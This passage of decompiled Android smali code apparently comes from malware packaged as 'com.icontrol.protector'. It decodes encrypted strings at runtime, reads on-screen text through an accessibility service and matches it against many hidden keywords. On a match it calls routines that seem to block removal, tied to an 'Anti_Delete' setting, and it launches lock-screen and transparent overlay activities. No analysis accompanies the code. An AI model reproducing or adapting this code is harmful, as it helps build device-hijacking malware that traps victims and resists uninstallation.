    goto :goto_b

    :sswitch_2
    new-array v4, v11, [B

    fill-array-data v4, :array_29

    new-array v12, v9, [B

    fill-array-data v12, :array_2a

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_f

    const/4 v3, 0x3

    goto :goto_b

    :sswitch_3
    new-array v4, v6, [B

    fill-array-data v4, :array_2b

    new-array v12, v9, [B

    fill-array-data v12, :array_2c

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_f

    const/4 v3, 0x2

    goto :goto_b

    :cond_f
    :goto_a
    const/4 v3, -0x1

    :goto_b
    if-eqz v3, :cond_13

    if-eq v3, v5, :cond_11

    const/4 v4, 0x2

    if-eq v3, v4, :cond_10

    const/4 v4, 0x3

    if-eq v3, v4, :cond_22

    goto :goto_d

    :cond_10
    invoke-static {}, Lcom/icontrol/protector/LockActivity;->b()Z

    move-result v3

    if-nez v3, :cond_14

    new-instance v3, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v12, Lcom/icontrol/protector/LockActivity;

    invoke-direct {v3, v4, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v4, 0x10000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x10000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    :goto_c
    invoke-virtual {v7, v3}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    goto :goto_d

    :cond_11
    sget-object v3, Lcom/icontrol/protector/AccessServices;->M:Ljava/util/HashMap;

    new-array v4, v6, [B

    fill-array-data v4, :array_2d

    new-array v12, v9, [B

    fill-array-data v12, :array_2e

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Ljava/lang/String;

    sget-object v4, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    if-eqz v4, :cond_12

    invoke-virtual {v4, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    :cond_12
    sget-object v3, Lcom/icontrol/protector/AccessServices;->M:Ljava/util/HashMap;

    new-array v4, v6, [B

    fill-array-data v4, :array_2f

    new-array v12, v9, [B

    fill-array-data v12, :array_30

    invoke-static {v4, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/util/HashMap;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    goto :goto_d

    :cond_13
    new-instance v3, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    const-class v12, Lcom/icontrol/protector/TransparentActivity;

    invoke-direct {v3, v4, v12}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v4, 0x10000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x80000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v4, 0x8000000

    invoke-virtual {v3, v4}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    goto :goto_c

    :cond_14
    :goto_d
    return-void

    :cond_15
    const/16 v12, 0x800

    if-ne v3, v12, :cond_19

    const/16 v12, 0xd

    new-array v3, v12, [B

    fill-array-data v3, :array_31

    new-array v4, v9, [B

    fill-array-data v4, :array_32

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v13, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_18

    const/16 v3, 0x16

    new-array v3, v3, [B

    fill-array-data v3, :array_33

    new-array v4, v9, [B

    fill-array-data v4, :array_34

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Lcom/icontrol/protector/a;->J(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v3

    if-eqz v3, :cond_22

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    move-result v4

    if-eqz v4, :cond_22

    const/16 v4, 0xd

    new-array v12, v4, [B

    fill-array-data v12, :array_35

    new-array v4, v9, [B

    fill-array-data v4, :array_36

    invoke-static {v12, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 v4, 0xe

    new-array v12, v4, [B

    fill-array-data v12, :array_37

    new-array v4, v9, [B

    fill-array-data v4, :array_38

    invoke-static {v12, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v4}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v12

    if-eqz v12, :cond_22

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v12

    invoke-interface {v12}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v12, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_22

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v3

    invoke-interface {v3}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v12, v6, [B

    fill-array-data v12, :array_39

    new-array v5, v9, [B

    fill-array-data v5, :array_3a

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_3b

    new-array v12, v9, [B

    fill-array-data v12, :array_3c

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v11, [B

    fill-array-data v5, :array_3d

    new-array v12, v9, [B

    fill-array-data v12, :array_3e

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v11, [B

    fill-array-data v5, :array_3f

    new-array v12, v9, [B

    fill-array-data v12, :array_40

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x3

    new-array v12, v5, [B

    fill-array-data v12, :array_41

    new-array v5, v9, [B

    fill-array-data v5, :array_42

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x7

    new-array v12, v5, [B

    fill-array-data v12, :array_43

    new-array v5, v9, [B

    fill-array-data v5, :array_44

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_45

    new-array v12, v9, [B

    fill-array-data v12, :array_46

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x5

    new-array v12, v5, [B

    fill-array-data v12, :array_47

    new-array v5, v9, [B

    fill-array-data v5, :array_48

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v15, [B

    fill-array-data v5, :array_49

    new-array v12, v9, [B

    fill-array-data v12, :array_4a

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v9, [B

    fill-array-data v5, :array_4b

    new-array v12, v9, [B

    fill-array-data v12, :array_4c

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_4d

    new-array v12, v9, [B

    fill-array-data v12, :array_4e

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xc

    new-array v12, v5, [B

    fill-array-data v12, :array_4f

    new-array v5, v9, [B

    fill-array-data v5, :array_50

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_51

    new-array v12, v9, [B

    fill-array-data v12, :array_52

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xc

    new-array v12, v5, [B

    fill-array-data v12, :array_53

    new-array v5, v9, [B

    fill-array-data v5, :array_54

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xc

    new-array v12, v5, [B

    fill-array-data v12, :array_55

    new-array v5, v9, [B

    fill-array-data v5, :array_56

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xc

    new-array v12, v5, [B

    fill-array-data v12, :array_57

    new-array v5, v9, [B

    fill-array-data v5, :array_58

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_59

    new-array v12, v9, [B

    fill-array-data v12, :array_5a

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_5b

    new-array v12, v9, [B

    fill-array-data v12, :array_5c

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v9, [B

    fill-array-data v5, :array_5d

    new-array v12, v9, [B

    fill-array-data v12, :array_5e

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xb

    new-array v12, v5, [B

    fill-array-data v12, :array_5f

    new-array v5, v9, [B

    fill-array-data v5, :array_60

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v11, [B

    fill-array-data v5, :array_61

    new-array v12, v9, [B

    fill-array-data v12, :array_62

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_63

    new-array v12, v9, [B

    fill-array-data v12, :array_64

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xd

    new-array v12, v5, [B

    fill-array-data v12, :array_65

    new-array v5, v9, [B

    fill-array-data v5, :array_66

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x7

    new-array v12, v5, [B

    fill-array-data v12, :array_67

    new-array v5, v9, [B

    fill-array-data v5, :array_68

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x7

    new-array v12, v5, [B

    fill-array-data v12, :array_69

    new-array v5, v9, [B

    fill-array-data v5, :array_6a

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v15, [B

    fill-array-data v5, :array_6b

    new-array v12, v9, [B

    fill-array-data v12, :array_6c

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xc

    new-array v12, v5, [B

    fill-array-data v12, :array_6d

    new-array v5, v9, [B

    fill-array-data v5, :array_6e

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xd

    new-array v12, v5, [B

    fill-array-data v12, :array_6f

    new-array v5, v9, [B

    fill-array-data v5, :array_70

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v15, [B

    fill-array-data v5, :array_71

    new-array v12, v9, [B

    fill-array-data v12, :array_72

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xb

    new-array v12, v5, [B

    fill-array-data v12, :array_73

    new-array v5, v9, [B

    fill-array-data v5, :array_74

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x7

    new-array v12, v5, [B

    fill-array-data v12, :array_75

    new-array v5, v9, [B

    fill-array-data v5, :array_76

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xe

    new-array v12, v5, [B

    fill-array-data v12, :array_77

    new-array v5, v9, [B

    fill-array-data v5, :array_78

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v9, [B

    fill-array-data v5, :array_79

    new-array v12, v9, [B

    fill-array-data v12, :array_7a

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0x18

    new-array v5, v5, [B

    fill-array-data v5, :array_7b

    new-array v12, v9, [B

    fill-array-data v12, :array_7c

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_7d

    new-array v12, v9, [B

    fill-array-data v12, :array_7e

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_7f

    new-array v12, v9, [B

    fill-array-data v12, :array_80

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v6, [B

    fill-array-data v5, :array_81

    new-array v12, v9, [B

    fill-array-data v12, :array_82

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/4 v5, 0x5

    new-array v12, v5, [B

    fill-array-data v12, :array_83

    new-array v5, v9, [B

    fill-array-data v5, :array_84

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xe

    new-array v12, v5, [B

    fill-array-data v12, :array_85

    new-array v5, v9, [B

    fill-array-data v5, :array_86

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xf

    new-array v5, v5, [B

    fill-array-data v5, :array_87

    new-array v12, v9, [B

    fill-array-data v12, :array_88

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    const/16 v5, 0xe

    new-array v12, v5, [B

    fill-array-data v12, :array_89

    new-array v5, v9, [B

    fill-array-data v5, :array_8a

    invoke-static {v12, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    new-array v5, v11, [B

    fill-array-data v5, :array_8b

    new-array v12, v9, [B

    fill-array-data v12, :array_8c

    invoke-static {v5, v12}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-nez v4, :cond_16

    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v3

    const/16 v4, 0xc

    new-array v5, v4, [B

    fill-array-data v5, :array_8d

    new-array v4, v9, [B

    fill-array-data v4, :array_8e

    invoke-static {v5, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v3

    if-eqz v3, :cond_17

    :cond_16
    invoke-static {}, Lcom/icontrol/protector/a;->w()V

    invoke-static {}, Lcom/icontrol/protector/a;->m()V

    :cond_17
    return-void

    :cond_18
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    :goto_e
    invoke-direct {v7, v3, v13, v2}, Lcom/icontrol/protector/AccessServices;->r(Landroid/content/Context;Ljava/lang/String;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    goto/16 :goto_10

    :cond_19
    if-ne v3, v5, :cond_1a

    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    goto :goto_e

    :cond_1a
    const/16 v5, 0x20

    if-eq v3, v5, :cond_1b

    const/high16 v5, 0x400000

    if-eq v3, v5, :cond_1b

    const/4 v5, 0x2

    if-ne v3, v5, :cond_22

    :cond_1b
    invoke-virtual/range {p0 .. p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v7, v3, v13, v2}, Lcom/icontrol/protector/AccessServices;->r(Landroid/content/Context;Ljava/lang/String;Landroid/view/accessibility/AccessibilityNodeInfo;)V

    sget-boolean v3, Lcom/icontrol/protector/AccessServices;->u:Z

    if-eqz v3, :cond_22

    sget-object v3, Lcom/icontrol/protector/My_Configs;->Anti_Delete:Ljava/lang/String;

